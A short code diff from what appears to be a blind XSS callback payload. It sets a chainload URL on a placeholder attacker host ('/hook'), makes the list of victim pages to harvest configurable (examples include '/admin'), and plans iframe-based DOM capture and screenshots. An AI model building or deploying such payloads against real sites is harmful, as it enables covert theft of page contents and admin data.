@@ -8208,9 +8208,10 @@
 //TODO: chanload_uri - configurable in UI settings
 //TODO: collect_page_list - configurable in UI settings
 //TODO: url - configurable in UI settings
+//TODO: collect pages via iframe, so we can DOM and also screenshot them via html2canvas
 
 var chainload_uri = "[[HOST_REPLACE_ME]]/hook";
-var collect_page_list = ["/"];
+var collect_page_list = []; // [[PAGE_LIST_REPLACE_ME]] e.g."/", "/admin", "test"
 
 function get_uid() {
 	var canvas = document.createElement("canvas");
